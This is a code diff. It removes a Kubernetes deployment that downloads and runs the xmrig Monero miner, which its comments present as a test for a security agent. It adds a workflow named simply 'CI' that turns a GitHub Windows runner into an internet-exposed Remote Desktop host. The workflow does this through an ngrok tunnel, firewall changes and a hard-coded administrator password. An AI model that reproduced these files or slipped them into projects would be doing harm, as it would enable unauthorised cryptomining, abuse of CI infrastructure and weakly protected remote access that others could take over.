@@ -1,50 +1,21 @@
-# Deploys a crypto miner malware example for testing the Lacework agent
-# Note: This will only work on Kubernetes clusters running on Intel based platforms.
-# Run the following command to deploy the example
-# kubectl apply -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
-# Run the following command to delete the example
-# kubectl delete -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  labels:
-    app: crypto-miner
-  name: crypto-miner
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: crypto-miner
-  template:
-    metadata:
-      labels:
-        app: crypto-miner
-    spec:
-      containers:
-      - image: ubuntu:18.04
-        name: crypto-miner
-        command:
-        - /bin/sh
-        - -c
-        - |
-          apt update
-          apt install -y curl
-          curl -L https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz -o xmrig.tar.gz --silent
-          tar xvfz xmrig.tar.gz
-          cd xmrig-6.19.2
-          config='{
-          "algo": "cryptonight",
-          "pools": [
-              {
-                  "url": "xmrpool.eu:9999",
-                  "user": "NOTAREALUSER",
-                  "pass": "x",
-                  "enabled": true,
-              }
-          ],
-          "retries": 10,
-          "retry-pause": 3,
-          "watch": true
-          }'
-          echo $config > config.json
-          ./xmrig -c config.json
+name: CI
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Download
+      run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+    - name: Extract
+      run: Expand-Archive ngrok.zip
+    - name: Auth
+      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+    - name: Enable TS
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+    - name: Create Tunnel
+      run: .\ngrok\ngrok.exe tcp 3389
